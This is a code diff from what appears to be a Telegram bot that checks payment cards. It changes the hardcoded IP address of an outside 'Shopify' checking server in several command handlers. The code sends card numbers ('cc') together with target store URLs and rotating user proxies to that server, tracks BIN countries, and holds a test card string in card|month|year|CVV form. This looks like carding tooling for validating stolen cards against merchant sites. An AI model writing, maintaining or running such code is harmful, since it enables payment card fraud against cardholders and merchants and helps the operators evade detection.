@@ -5499,7 +5499,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 `);
 
         const startTime = Date.now();
-        const SHOPIFY_API_URL = "http://108.165.12.183:8081/";
+        const SHOPIFY_API_URL = "http://148.230.102.178:8081/";
         const SHOPIFY_DEBUG_CHAT = "-1003848532661";
         const SH_UNKNOWN_RETRIES = 4;
 
@@ -5911,7 +5911,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const { data: mshProxiesRaw } = await supabase.from("user_proxies").select("*").eq("user_id", mshProfile.user_id);
         const mshProxies = mshProxiesRaw || [];
 
-        const SHOPIFY_API_URL_MSH = "http://108.165.12.183:8081/";
+        const SHOPIFY_API_URL_MSH = "http://148.230.102.178:8081/";
         const MSH_DEBUG_CHAT = "-1003848532661";
         const MSH_UNKNOWN_RETRIES = 3;
         const mshStartTime = Date.now();
@@ -6362,7 +6362,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const { data: mtxtProxiesRaw } = await supabase.from("user_proxies").select("*").eq("user_id", mtxtProfile.user_id);
         const mtxtProxies = mtxtProxiesRaw || [];
 
-         const SHOPIFY_API_URL_MTXT = "http://108.165.12.183:8081/";
+         const SHOPIFY_API_URL_MTXT = "http://148.230.102.178:8081/";
          const MTXT_MAX_RETRIES = 1; // Keep /mtxt fast: one hard API retry, then rotate site/card thread
          const MTXT_API_TIMEOUT_MS = 30000;
          const mtxtStartTime = Date.now();
@@ -9918,8 +9918,8 @@ ${resultsDisplay || "Waiting for results..."}
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) =>
           proxy
-            ? `http://108.165.12.183:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
-            : `http://108.165.12.183:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`,
+            ? `http://148.230.102.178:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
+            : `http://148.230.102.178:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
